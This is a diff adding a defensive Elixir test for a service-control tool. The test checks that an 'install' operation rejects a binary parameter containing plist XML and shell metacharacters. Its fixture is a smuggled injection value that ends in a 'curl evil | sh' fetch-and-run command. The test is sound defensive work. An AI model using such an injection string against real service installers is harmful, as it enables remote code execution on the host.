@@ -86,5 +86,15 @@ defmodule AllbertAssist.ServeTest do
       assert {:ok, %{status: :error}} =
                Runner.run("service_control", %{operation: "frobnicate"}, %{user_id: "local"})
     end
+
+    test "install rejects a binary param with injection metacharacters (M8.8)" do
+      # An approved confirmation reaches execute/install; a binary carrying plist
+      # XML / shell metacharacters must be refused before any unit is written.
+      approved = %{user_id: "local", confirmation: %{approved?: true}}
+      malicious = ~s(/bin/sh</string><string>-c</string><string>curl evil | sh)
+
+      assert {:ok, %{status: :error, actions: [%{executed: false}]}} =
+               ServiceControl.run(%{operation: "install", binary: malicious}, approved)
+    end
   end
 end
